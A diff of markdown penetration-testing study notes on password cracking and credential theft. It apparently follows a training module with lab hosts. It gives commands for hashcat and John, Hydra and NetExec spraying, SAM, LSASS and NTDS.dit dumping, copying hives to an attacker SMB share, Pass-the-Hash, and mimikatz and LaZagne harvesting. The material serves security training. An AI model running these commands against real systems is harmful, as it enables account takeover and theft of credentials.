@@ -1,774 +1,721 @@
-# Password Attacks & Credential Hunting
+# Password Attacks
 
-HaveIBeenPwned: https://haveibeenpwned.com | rockyou.txt: `/usr/share/wordlists/rockyou.txt` | SecLists: `/usr/share/seclists/`
+Authentication = validating identity via factors: something you know (password/PIN), have (card/device), are (biometrics), somewhere you are (IP/location). Passwords still dominate, and humans are the weak point: ~66% reuse passwords across accounts, ~55% keep a password after it appears in a breach. HaveIBeenPwned tells you (or your target) which breaches an email has appeared in — one cracked password often opens other platforms.
 
----
+## Introduction to Password Cracking
 
-## Hash Identification
+Hashes are one-way:
 
 ```bash
-hashid -j <HASH>          # identify hash + JtR format
-hashid -m <HASH>          # identify hash + hashcat mode
+echo -n 'Soccer06!' | md5sum
+echo -n 'Soccer06!' | sha256sum
 ```
 
-Hash format reference: https://hashcat.net/wiki/doku.php?id=example_hashes JtR sample hashes: https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
+- **Rainbow tables** — precomputed input→hash maps, instant lookups. Defeated by **salting**: random bytes added before hashing (`echo -n 'Th1sIsTh3S@lt_Soccer06!' | md5sum`). Salts aren't secret (stored alongside the hash, needed for verification) — they just explode the table size (1 salt byte = 256× the entries).
+- **Brute-force** — every combination; 100% effective given time, realistic only under ~9 chars. Speed is algorithm-bound: hashcat on a laptop ≈ 5M/s against MD5 vs ~10k/s against DCC2.
+- **Dictionary** — wordlist of statistically likely passwords; the pentester's default. rockyou.txt = 14M real passwords leaked from RockYou in 2009 (stored unencrypted). SecLists is the other main source.
 
-Common hash formats:
+## Introduction to John The Ripper
 
-|Hash|Hashcat Mode|JtR Format|
-|---|---|---|
-|MD5|0|raw-md5|
-|NTLM/NT|1000|nt|
-|SHA1|100|raw-sha1|
-|SHA-256|1400|raw-sha256|
-|SHA-512|1700|raw-sha512|
-|sha512crypt ($6$)|1800|sha512crypt|
-|MD5crypt ($1$)|500|md5crypt|
-|bcrypt ($2a$)|3200|bf|
-|DCC2 (MSCache2)|2100|mscach2|
-|NetNTLMv2|5600|netntlmv2|
-|NetNTLMv1|5500|netntlm|
-|Kerberos AS-REP|18200|krb5asrep|
-|Kerberos TGS|13100|krb5tgs|
-|BitLocker|22100|—|
-|WPA/WPA2 PMKID|22000|—|
-|DPAPI masterkey|15900|—|
+Use the **jumbo** variant (optimizations, more formats, 64-bit). Cracking modes:
 
----
-
-## John the Ripper (JtR)
+- **Single crack** — generates candidates from the account's own data (username, home dir, GECOS real name/phone). Built for Linux passwd/shadow files:
 
 ```bash
-# Single crack (rule-based on username/GECOS info — best for /etc/shadow)
 john --single passwd
-
-# Wordlist attack
-john --wordlist=<WORDLIST> <HASH_FILE>
-john --wordlist=rockyou.txt --rules=best64 <HASH_FILE>
-
-# Incremental (brute-force with Markov chains)
-john --incremental <HASH_FILE>
-
-# Specify format
-john --format=nt --wordlist=rockyou.txt <HASH_FILE>
-
-# Show cracked
-john <HASH_FILE> --show
-
-# Unshadow Linux /etc/passwd + /etc/shadow for cracking
-unshadow /etc/passwd /etc/shadow > unshadowed.hashes
-john --wordlist=rockyou.txt unshadowed.hashes
 ```
 
----
-
-## Hashcat
+- **Wordlist** — dictionary mode, multiple lists comma-separated, `--rules` to mutate:
 
 ```bash
-# Basic syntax
-hashcat -a <MODE> -m <TYPE> <HASHES> [wordlist/mask]
-
-# -a 0 Dictionary attack
-hashcat -a 0 -m 0 hashes.txt rockyou.txt
-hashcat -a 0 -m 1000 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
-
-# -a 3 Mask attack (brute-force with defined keyspace)
-hashcat -a 3 -m 0 hash.txt '?u?l?l?l?l?d?s'   # e.g. Aaaaa1!
-
-# Generate mutated wordlist (stdout, no cracking)
-hashcat --force wordlist.txt -r custom.rule --stdout | sort -u > mut_passwords.txt
-
-# Rules location
-ls /usr/share/hashcat/rules/
-# best64.rule, dive.rule, d3ad0ne.rule, rockyou-30000.rule
+john --wordlist=<wordlist> <hash_file>
 ```
 
-Mask charset symbols:
-
-- `?l` = lowercase `?u` = uppercase `?d` = digits `?s` = symbols `?a` = all printable `?h` = hex lower `?H` = hex upper
-
-Custom charset: `-1 <chars>` then use `?1` in mask.
-
----
-
-## Custom Wordlists
-
-Hashcat rule functions:
-
-- `:` = no-op, `c` = capitalize, `l` = lowercase, `u` = uppercase
-- `so0` = replace o→0, `sa@` = replace a→@
-- `$!` = append `!`
-
-Sample rule file:
-
-```
-:
-c
-so0
-c so0
-sa@
-c sa@ so0
-$!
-$! c so0 sa@
-```
+- **Incremental** — Markov-modeled brute force, tries likely combinations first; slowest. Configurable charsets in `john.conf` under `[Incremental:...]`:
 
 ```bash
-# Generate mutations
-hashcat --force wordlist.txt -r custom.rule --stdout | sort -u > mut_passwords.txt
-
-# CeWL — scrape company website for likely passwords
-cewl https://www.target.com -d 4 -m 6 --lowercase -w target.wordlist
-
-# Username Anarchy
-./username-anarchy -i names.txt > usernames.txt
+john --incremental <hash_file>
 ```
 
----
+Unknown hash format: check JtR's sample-hash docs, or:
+
+```bash
+hashid -j 193069ceb0461e1d40d216e32c79c704     # suggests formats + JtR format names
+```
+
+hashid is often ambiguous (a bare 32-hex string matches MD2/MD5/MD4/NTLM/...). Context of where the hash came from usually decides it. Tell JtR the format with `--format=` — common ones: `raw-md5`, `raw-sha1/sha256/sha512`, `nt`, `netntlmv2`, `mysql`, `mysql-sha1`, `mssql`, `mssql05`, `krb5`, `mscash2`, `ssh`, `pdf`, `zip`, `rar`.
+
+Cracking encrypted files — the *2john* converters produce JtR-ready hashes:
+
+```bash
+<tool> <file_to_crack> > file.hash
+locate *2john        # full inventory on the box
+```
+
+ssh2john, zip2john, rar2john, pdf2john, office2john, keepass2john, bitlocker2john, gpg2john, putty2john, pfx2john, keychain2john, vncpcap2john, hccap2john/wpa2john, truecrypt_volume2john, mscash2john, 1password2john, 7z2john, androidbackup2john...
+
+## Introduction to Hashcat
+
+```bash
+hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]
+```
+
+`-a` = attack mode, `-m` = hash type ID (`hashcat --help` lists all; hashcat.net example hashes page for identification; `hashid -m <hash>` suggests the mode).
+
+**Dictionary (-a 0):**
+
+```bash
+hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 rockyou.txt
+# wordlist not enough → apply rules:
+hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c rockyou.txt -r best64.rule
+```
+
+Rules live in /usr/share/hashcat/rules — best64 (the standard first try), dive, d3ad0ne, generated, rockyou-30000, T0XlC*, toggles*, leetspeak variants.
+
+**Mask (-a 3)** — brute force over a user-defined keyspace. Built-in charsets: `?l ?u ?d ?h ?H ?s ?a ?b`; custom sets via `-1`..`-4` referenced as `?1`..`?4`.
+
+```bash
+hashcat -a 3 -m 0 <hash> '?u?l?l?l?l?d?s'    # uppercase + 4 lowercase + digit + symbol
+```
+
+## Writing Custom Wordlists and Rules
+
+Users follow predictable mutations to satisfy policies: `Password → Password123 → Password2022 → Password2022! → P@ssw0rd2022!`. Company name, pets, hobbies, months/seasons + year are the usual ingredients (OSINT feeds this). Most passwords are ≤10 chars.
+
+Hashcat rule syntax for generating candidates:
+
+```text
+:      do nothing
+l / u  lowercase / uppercase all
+c      capitalize first, lowercase rest
+sXY    replace all X with Y
+$!     append !
+```
+
+custom.rule combining them (`c`, `so0`, `sa@`, `$!` and combinations), then:
+
+```bash
+hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
+```
+
+15 variants from one word. Build wordlists from the target's own site with CeWL:
+
+```bash
+cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
+# -d spider depth, -m min word length
+```
 
 ## Cracking Protected Files
 
+Hunt for document types on a compromised host:
+
 ```bash
-# File 2john conversion pattern
-<tool> <file> > hash.txt; john --wordlist=rockyou.txt hash.txt; john hash.txt --show
+for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core";done
+```
 
-# SSH private key
-ssh2john.py id_rsa > ssh.hash
-# Check if key is password-protected
-ssh-keygen -yf id_rsa       # prompts = protected
+SSH keys have no extension — find them by header/footer:
 
-# Office documents
-office2john.py Protected.docx > doc.hash
+```bash
+grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
+```
 
-# PDF
-pdf2john.py doc.pdf > pdf.hash
+Old PEM keys declare encryption in the header (`Proc-Type: 4,ENCRYPTED`, `DEK-Info: AES-128-CBC,...`); modern keys look identical either way. Test with `ssh-keygen -yf key` — a passphrase prompt means encrypted. Crack:
 
-# ZIP archive
-zip2john archive.zip > zip.hash
+```bash
+ssh2john.py SSH.private > ssh.hash
+john --wordlist=rockyou.txt ssh.hash
+john ssh.hash --show
+```
 
-# RAR archive
-rar2john archive.rar > rar.hash
+Documents follow the same pattern — `office2john.py Protected.docx > hash` for all common Office formats, `pdf2john.py PDF.pdf > hash`, then JtR/hashcat. Worth trying even against strong passwords: the contents often carry access further.
 
-# KeePass database
-keepass2john database.kdbx > keepass.hash
+## Cracking Protected Archives
 
-# BitLocker VHD
+Common archive types: tar, gz, rar, zip, cpt, truecrypt, bitlocker, kdbx, 7z, gzip. Not all support passwords natively (tar is usually encrypted with openssl/gpg on top). Pull a full extension reference:
+
+```bash
+curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
+```
+
+**ZIP** — same 2john pattern:
+
+```bash
+zip2john ZIP.zip > zip.hash
+john --wordlist=rockyou.txt zip.hash
+```
+
+**OpenSSL-encrypted GZIP** — identify with `file` → "openssl enc'd data with salted password". Hash-cracking is flaky here; more reliable: loop decryption directly and let success pick the password (gzip errors are normal noise):
+
+```bash
+for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done
+# check ls afterwards for the extracted file
+```
+
+**BitLocker** (AES 128/256, full-disk; 48-digit recovery key also exists):
+
+```bash
 bitlocker2john -i Backup.vhd > backup.hashes
-grep "bitlocker\$0" backup.hashes > backup.hash
-hashcat -a 0 -m 22100 backup.hash rockyou.txt
+grep "bitlocker\$0" backup.hashes > backup.hash    # hashes 1-2 = password, 3-4 = recovery key (don't bother)
+hashcat -a 0 -m 22100 '$bitlocker$0$...' rockyou.txt   # slow (~25 H/s) — be patient
+```
 
-# Mount BitLocker on Linux after cracking
+Mounting: Windows — double-click the .vhd, then the BitLocker volume prompts for the password. Linux — dislocker:
+
+```bash
+sudo apt-get install dislocker
+sudo mkdir -p /media/bitlocker /media/bitlockermount
 sudo losetup -f -P Backup.vhd
 sudo dislocker /dev/loop0p2 -u<PASSWORD> -- /media/bitlocker
 sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
-
-# OpenSSL-encrypted GZIP
-for i in $(cat rockyou.txt); do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz; done
-
-# Find all *2john tools
-locate *2john*
+# cleanup: umount /media/bitlockermount && umount /media/bitlocker
 ```
 
----
+## Network Services
 
-## Network Service Brute Forcing
+Every service with username/password auth is a password-attack surface (FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP, LDAP).
 
-**NetExec (nxc/netexec)** — multi-protocol:
+**WinRM** (TCP 5985 HTTP / 5986 HTTPS). NetExec validates credentials fast:
 
 ```bash
-netexec <proto> <TARGET> -u <USER/LIST> -p <PASS/LIST>
-netexec winrm <TARGET> -u users.txt -p passwords.txt
-netexec smb <TARGET> -u users.txt -p passwords.txt
-netexec ssh <TARGET> -u admin -p passwords.txt
-netexec rdp <TARGET> -u users.txt -p passwords.txt
-netexec smb <SUBNET>/24 -u admin -p 'Password1!'   # spraying
+netexec winrm <TARGET_IP> -u user.list -p password.list
+# [+] None\user:password (Pwn3d!)   ← Pwn3d! = likely command execution
 
-# Credential stuffing (user:pass format)
-netexec smb <TARGET> -u user_pass.list -p ''
-# Or with -C for combo file (user:pass per line)
-
-# Dump SAM/LSA/NTDS remotely
-netexec smb <TARGET> --local-auth -u admin -p <PASS> --sam
-netexec smb <TARGET> --local-auth -u admin -p <PASS> --lsa
-netexec smb <TARGET> -u admin -p <PASS> -M ntdsutil   # NTDS.dit dump
-
-# Check shares + permissions
-netexec smb <TARGET> -u admin -p <PASS> --shares
-
-# Execute command
-netexec smb <TARGET> -u admin -p <PASS> -x whoami
-
-# Spider share for content pattern
-netexec smb <TARGET> -u admin -p <PASS> --spider <SHARE> --content --pattern "passw"
-
-# Result meaning: (Pwn3d!) = local admin confirmed
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>    # gem install evil-winrm
 ```
 
-**Hydra:**
+**SSH** (22):
 
 ```bash
-hydra -L users.txt -P passwords.txt ssh://<TARGET>
-hydra -L users.txt -P passwords.txt rdp://<TARGET> -t 4 -W 3
-hydra -L users.txt -P passwords.txt smb://<TARGET>
-hydra -C user_pass.txt ssh://<TARGET>        # credential stuffing
+hydra -L user.list -P password.list ssh://<TARGET_IP>     # add -t 4, SSH limits parallel tasks
+ssh user@<TARGET_IP>
 ```
 
-**Evil-WinRM:**
+**RDP** (3389):
 
 ```bash
-sudo gem install evil-winrm
-evil-winrm -i <TARGET> -u <USER> -p <PASS>
-evil-winrm -i <TARGET> -u Administrator -H <NTLM_HASH>   # Pass-the-Hash
-evil-winrm -i <TARGET> -r <DOMAIN>                        # Kerberos auth (needs KRB5CCNAME)
+hydra -L user.list -P password.list rdp://<TARGET_IP>     # -t 1/-t 4, -W 1/-W 3 — RDP hates parallel connections
+xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD>
 ```
 
-**SMB via Metasploit (SMBv3 fallback):**
+**SMB** (445):
 
-```
-use auxiliary/scanner/smb/smb_login
-set RHOSTS <TARGET>
-set USER_FILE users.txt
-set PASS_FILE passwords.txt
-run
+```bash
+hydra -L user.list -P password.list smb://<TARGET_IP>
 ```
 
-**Default creds tool:**
+Hydra "[ERROR] invalid reply" against SMBv3 = outdated hydra; either rebuild it or use `auxiliary/scanner/smb/smb_login` (set USER_FILE, PASS_FILE, RHOSTS). After creds land:
+
+```bash
+netexec smb <TARGET_IP> -u user -p password --shares
+smbclient -U user \\\\<TARGET_IP>\\<SHARE>
+```
+
+## Spraying, Stuffing, and Defaults
+
+- **Password spraying** — one password, many accounts. Deadly where new users get a standard initial password (`ChangeMe123!`). Burp for web apps; NetExec/Kerbrute for AD:
+
+```bash
+netexec smb <SUBNET>/24 -u usernames.list -p 'ChangeMe123!'
+```
+
+- **Credential stuffing** — leaked username:password pairs replayed elsewhere. With a combo list:
+
+```bash
+hydra -C user_pass.list ssh://<TARGET_IP>
+```
+
+- **Default credentials** — routers, firewalls, databases. Automated lookup:
 
 ```bash
 pip3 install defaultcreds-cheat-sheet
-creds search <product>    # e.g. creds search linksys
+creds search linksys
 ```
 
----
+Classic router defaults: Linksys/D-Link/3Com/BenQ `admin:Admin` at 192.168.1.1, Belkin `admin:admin`, Netgear `admin:password`, Digicom `admin:Michelangelo`. Also check product documentation.
 
-## Attacking SAM/SYSTEM/SECURITY
+## Windows Authentication Process
 
-Hive files needed:
+Interactive logon chain: WinLogon (launches LogonUI, collects creds via COM credential providers) → LSASS → authentication packages (DLLs) → SAM or AD.
 
-- `HKLM\SAM` — local account hashes
-- `HKLM\SYSTEM` — boot key (needed to decrypt SAM)
-- `HKLM\SECURITY` — cached domain creds (DCC2), DPAPI keys
+- **Lsasrv.dll** — LSA server; Negotiate picks NTLM vs Kerberos
+- **Msv1_0.dll** — local machine logons
+- **Samsrv.dll** — SAM (local accounts)
+- **Kerberos.dll** — Kerberos auth
+- **Netlogon.dll** — network logon service
+- **Ntdsa.dll** — DSA managing ntds.dit (DCs only)
+
+**SAM** — local account hashes (LM/NTLM), `%SystemRoot%\system32\config\SAM`, mounted at HKLM\SAM, SYSTEM privileges to read. Workgroup box = local SAM validates; domain-joined = DC validates against ntds.dit (`%SystemRoot%\ntds.dit`). SYSKEY partially encrypts SAM on disk. **Credential Manager** stores per-user at `C:\Users\<user>\AppData\Local\Microsoft\[Vault/Credentials]\`. **NTDS.dit** holds user accounts + hashes, groups, computers, GPOs — synchronized across DCs.
+
+## Attacking SAM, SYSTEM, and SECURITY
+
+With local admin, grab the hives (SAM = local hashes, SYSTEM = bootkey that decrypts SAM, SECURITY = DCC2 cached domain creds / LSA secrets / DPAPI keys):
 
 ```cmd
-# Windows (admin cmd) — dump hives
 reg.exe save hklm\sam C:\sam.save
 reg.exe save hklm\system C:\system.save
 reg.exe save hklm\security C:\security.save
 ```
 
-Transfer to attacker via impacket SMB server, then:
+Exfil via attacker SMB share (smb2support or modern Windows won't connect):
 
 ```bash
-# Attacker — start SMB server
-sudo impacket-smbserver CompData /tmp/loot -smb2support
-
-# Windows — copy files
-move sam.save \\<LHOST>\CompData
-move system.save \\<LHOST>\CompData
-move security.save \\<LHOST>\CompData
+impacket-smbserver -smb2support CompData /home/user/share
 ```
 
+```cmd
+move sam.save \\<ATTACKER_IP>\CompData
+```
+
+Dump offline — secretsdump pulls the bootkey from SYSTEM first, then SAM (`uid:rid:lmhash:nthash`), cached domain logons, LSA secrets, DPAPI keys:
+
 ```bash
-# Offline dump (attacker)
 impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
-
-# Remote dump (if creds available)
-netexec smb <TARGET> --local-auth -u admin -p <PASS> --sam
-netexec smb <TARGET> --local-auth -u admin -p <PASS> --lsa
 ```
 
-Output format: `username:RID:LMhash:NThash:::`
+Crack the NT hashes (mode 1000):
 
 ```bash
-# Crack NT hashes
-hashcat -m 1000 ntlm_hashes.txt rockyou.txt
-
-# Crack DCC2 (domain cached creds) — much slower ~800x
-hashcat -m 2100 '$DCC2$10240#<user>#<hash>' rockyou.txt
+hashcat -m 1000 hashestocrack.txt rockyou.txt
 ```
 
-> [!warning] DCC2 cannot be used for Pass-the-Hash. Crack to plaintext first. NT hashes can be used directly for PtH.
+**DCC2** (cached domain creds from SECURITY): `$DCC2$10240#user#<hash>`, PBKDF2 → ~800× slower than NTLM and useless for PtH. Mode 2100.
 
----
+**DPAPI** keys also come out of that dump — they unlock Chrome/IE saved passwords, Outlook, RDP saved creds, Credential Manager. Decrypt with Impacket's dpapi tool, mimikatz (`dpapi::chrome /in:"...\Login Data" /unprotect`), or remotely with DonPAPI.
+
+Remote one-shots with local-admin creds:
+
+```bash
+netexec smb <TARGET_IP> --local-auth -u bob -p <PASSWORD> --lsa    # LSA secrets + dpapi keys + NL$KM
+netexec smb <TARGET_IP> --local-auth -u bob -p <PASSWORD> --sam    # local SAM hashes
+```
 
 ## Attacking LSASS
 
-LSASS stores: NT hashes (MSV), Kerberos tickets/keys, DPAPI masterkeys. Optionally cleartext (WDIGEST — disabled Win8+).
+LSASS caches credentials, mints tokens, writes the security log. Dump its memory, crack offline.
 
-**GUI method (interactive session):** Task Manager → Details → lsass.exe → Create dump file → `%temp%\lsass.DMP`
+- **Task Manager** (GUI session): Processes → Local Security Authority Process → Create dump file → `lsass.DMP` in %temp%.
+- **rundll32** (shell session; modern AV flags this):
 
-**CLI method (no GUI):**
-
-```powershell
-# Get PID
-Get-Process lsass
-# or
-tasklist /svc | findstr lsass
-
-# Create dump (needs elevation; flagged by modern AV)
+```cmd
+tasklist /svc                    # find lsass.exe PID
+Get-Process lsass                # PowerShell alternative
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 ```
 
-**Parse dump on Linux:**
+Extract on the Linux attack host with pypykatz (Mimikatz in Python — runs from Linux against the dump file):
 
 ```bash
-pip3 install pypykatz
 pypykatz lsa minidump lsass.dmp
 ```
 
-Key output sections: MSV (NT+SHA1 hashes), Kerberos (tickets), WDIGEST (cleartext if enabled), DPAPI (masterkey).
+What the output gives you per logon session:
 
-```bash
-# Crack extracted NT hash
-hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b rockyou.txt
+- **MSV** — username, domain, SID, NT + SHA1 hashes
+- **WDIGEST** — cleartext passwords when enabled (default on XP–8 / 2003–2012; disabled on modern Windows, patch exists for old systems)
+- **Kerberos** — cached passwords, ekeys, tickets, pins → reuse for domain access
+- **DPAPI** — masterkeys → decrypt that user's DPAPI blobs
+
+Then `hashcat -m 1000 <NTHASH> rockyou.txt`.
+
+## Attacking Windows Credential Manager
+
+Vault folders (each with a Policy.vpol holding DPAPI-protected AES keys that encrypt the credentials): `%UserProfile%\AppData\Local\Microsoft\Vault\` and `...\Credentials\`, plus Roaming/ProgramData/systemprofile variants. Newer Windows adds Credential Guard (VBS-protected masterkeys). Two locker types: Web Credentials (IE/legacy Edge) and Windows Credentials (OneDrive tokens, domain creds, shares, services).
+
+Enumerate and abuse:
+
+```cmd
+cmdkey /list                                  # Target / Type / User / Persistence per entry
+runas /savecred /user:SRV01\mcharles cmd      # use a stored Domain:interactive credential
+rundll32 keymgr.dll,KRShowKeyMgr              # export vault to .crd
 ```
 
----
+With mimikatz (admin): `privilege::debug` then `sekurlsa::credman` dumps the stored credentials from memory. SharpDPAPI, LaZagne, DonPAPI do the same job.
 
-## Attacking NTDS.dit
+## Attacking Active Directory and NTDS.dit
 
-NTDS.dit = AD database on Domain Controllers. Contains all domain user hashes. Requires domain admin or equivalent.
+Domain-joined machines still allow local SAM logons (`HOSTNAME\user` or `.\user` at the logon UI). Dictionary attacks against AD are noisy (event 4776 for every NTLM validation) and risk lockouts — note: default domain GPO historically has **no** account lockout policy.
+
+Build the username list first. Conventions: `jdoe`, `jjdoe`, `janedoe`, `jane.doe`, `doe.jane`. Email structure = username (`jdoe@domain` → jdoe). Tips from the module: Google `"@inlanefreight.com"` for valid addresses; dorks like `inlanefreight.com filetype:pdf` leak usernames in PDF metadata; some orgs alias real usernames to opaque ones (a907) specifically to break spraying.
 
 ```bash
-# 1. Enumerate AD users with kerbrute
+./username-anarchy -i names.txt                  # auto-generate every convention per name
+
+# confirm valid usernames before password guessing (Kerberos pre-auth enumeration):
 ./kerbrute_linux_amd64 userenum --dc <DC_IP> --domain <DOMAIN> names.txt
 
-# 2. Brute-force SMB for domain creds
-netexec smb <DC_IP> -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
+# dictionary attack via SMB:
+netexec smb <DC_IP> -u bwilliamson -p fasttrack.txt
+# [+] ...:P@55w0rd!  → watch lockout policy; one attempt per user is safer (spraying)
+```
 
-# 3. Connect to DC
-evil-winrm -i <DC_IP> -u <USER> -p <PASS>
+**Capturing NTDS.dit** (needs local admin/DA on the DC):
+
+```bash
+evil-winrm -i <DC_IP> -u bwilliamson -p '<PASSWORD>'
 ```
 
 ```powershell
-# On DC — create VSS copy and extract NTDS.dit
+net localgroup          # check Administrators membership
+net user bwilliamson    # check Domain Admins membership
 vssadmin CREATE SHADOW /For=C:
-cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
-# Also need SYSTEM hive for boot key
-reg.exe save hklm\system C:\NTDS\SYSTEM.save
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+cmd.exe /c move C:\NTDS\NTDS.dit \\<ATTACKER_IP>\CompData
 ```
+
+Like SAM, NTDS.dit hashes are encrypted with a key in SYSTEM — grab both. Offline:
 
 ```bash
-# Quick one-liner via NetExec
-netexec smb <DC_IP> -u <USER> -p <PASS> -M ntdsutil
-
-# Offline extraction
-impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL    # finds/decrypts the PEK, dumps all domain hashes (+ AES keys for Kerberos)
 ```
 
-Output: `username:RID:LMhash:NThash:::` for all domain accounts.
+Or the one-liner that does VSS + dump + cleanup itself:
 
 ```bash
-# Crack
-hashcat -m 1000 ntds_hashes.txt rockyou.txt
+netexec smb <DC_IP> -u bwilliamson -p '<PASSWORD>' -M ntdsutil
+# filter enabled accounts afterwards:
+grep -iv disabled <ntds-output-file> | cut -d ':' -f1
 ```
 
----
+Crack with `-m 1000`; uncrackable Administrator hash → Pass the Hash:
 
-## Windows Credential Manager
+```bash
+evil-winrm -i <DC_IP> -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
+```
+
+## Credential Hunting in Windows
+
+Search terms worth grepping for: passwords, passphrases, keys, username, user account, creds, users, passkeys, configuration, dbcredential, dbpassword, pwd, login, credentials. Windows Search works with GUI access; from CLI:
 
 ```cmd
-# List stored credentials
-cmdkey /list
-
-# Impersonate stored cred via runas
-runas /savecred /user:<DOMAIN>\<USER> cmd
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 ```
 
-```
-# Mimikatz — dump Credential Manager from LSASS
-privilege::debug
-sekurlsa::credman
+LaZagne harvests application-stored credentials — keep a standalone copy to drop on targets:
 
-# Dump DPAPI browser credentials
-dpapi::chrome /in:"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+```cmd
+start LaZagne.exe all        :: -vv for verbose; per-module: browsers, chats, mails, memory, sysadmin, windows, wifi
 ```
 
-Stored vault locations:
+Browsers are the richest target (35 supported on Windows; chrome/edge/firefox stores are encrypted but decryptable — firefox_decrypt, decrypt-chrome-passwords). Also check: passwords in GPO/scripts on SYSVOL, scripts on IT shares, web.config on dev machines, unattend.xml, AD user/computer description fields, KeePass databases, and files literally named pass.txt / passwords.docx / passwords.xlsx on systems, shares, and SharePoint.
 
-- `%UserProfile%\AppData\Local\Microsoft\Vault\`
-- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
+## Linux Authentication Process
 
----
+PAM (`pam_unix.so` in `/usr/lib/x86_64-linux-gnu/security/`) reads/writes `/etc/passwd` and `/etc/shadow`.
+
+**/etc/passwd** — 7 colon fields: username, password, UID, GID, GECOS, home, shell. World-readable. `x` = hash in shadow; a hash here (ancient systems) = crackable; a *writable* passwd lets you blank root's password field entirely (`root::0:0:...` → passwordless `su`).
+
+**/etc/shadow** — 9 fields; password format `$<id>$<salt>$<hashed>`. IDs: `1` MD5, `2a` Blowfish, `5` SHA-256, `6` SHA-512, `y` yescrypt (Debian default now), `gy` gost-yescrypt, `7` scrypt. `!` or `*` = no password login (other auth methods may still work); empty = no password required. Watch the algorithm — MD5 cracks vastly faster than SHA-512.
+
+**/etc/security/opasswd** — PAM's old-password history (root-readable). Old hashes there reveal patterns for guessing the current password.
+
+Cracking Linux creds as root:
+
+```bash
+cp /etc/passwd /tmp/passwd.bak; cp /etc/shadow /tmp/shadow.bak
+unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
+hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o cracked.txt    # 1800 = sha512crypt
+```
+
+This exact scenario is what JtR single crack mode was designed for.
+
+## Credential Hunting in Linux
+
+Four hunting buckets: **files** (configs, databases, notes, scripts, cronjobs, SSH keys), **history** (logs, command history), **memory** (cache, in-memory processing), **key-rings** (browser stores). Adapt to the box's role — an isolated DB server won't have normal users.
+
+```bash
+# config files (.conf/.config/.cnf), then grep them for creds
+for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core";done
+for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
+
+# databases
+for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
+
+# notes (named anything, extension or not)
+find /home/* -type f -name "*.txt" -o ! -name "*.*"
+
+# scripts
+for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
+
+# cronjobs (creds hardcoded for automation)
+cat /etc/crontab
+ls -la /etc/cron.*/          # .d, .daily, .hourly, .monthly, .weekly
+
+# history
+tail -n5 /home/*/.bash*      # .bash_history, .bashrc, .bash_profile
+
+# logs — auth hits
+for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|failure\|failed\|ssh\|sudo\|COMMAND\=" $i 2>/dev/null;fi;done
+```
+
+Key log files: `/var/log/auth.log` (Debian) / `secure` (RHEL), `faillog`, `cron`, `mail.log`, `httpd`, `mysqld.log`, `syslog`/`messages`.
+
+Memory and stores:
+
+```bash
+sudo python3 mimipenguin.py              # plaintext creds from memory (GNOME keyring etc.)
+sudo python2.7 laZagne.py all            # wifi, ssh, shadow, AWS, keepass, git, browsers, keyrings...
+```
+
+Firefox keeps saved logins in `~/.mozilla/firefox/<profile>/logins.json` (+ key4.db) — decrypt with `python3.9 firefox_decrypt.py`, or `python3 laZagne.py browsers`.
+
+## Credential Hunting in Network Traffic
+
+Legacy/misconfigured services still speak plaintext. Pairs to know: HTTP/HTTPS, FTP/FTPS, SNMP/SNMPv3, POP3/POP3S, IMAP/IMAPS, SMTP/SMTPS, LDAP/LDAPS, DNS/DoH, SMB/SMB3-over-TLS, VNC/VNC-TLS.
+
+Wireshark filters that matter for hunting:
+
+```text
+http                                  # plaintext web traffic
+http.request.method == "POST"         # form logins
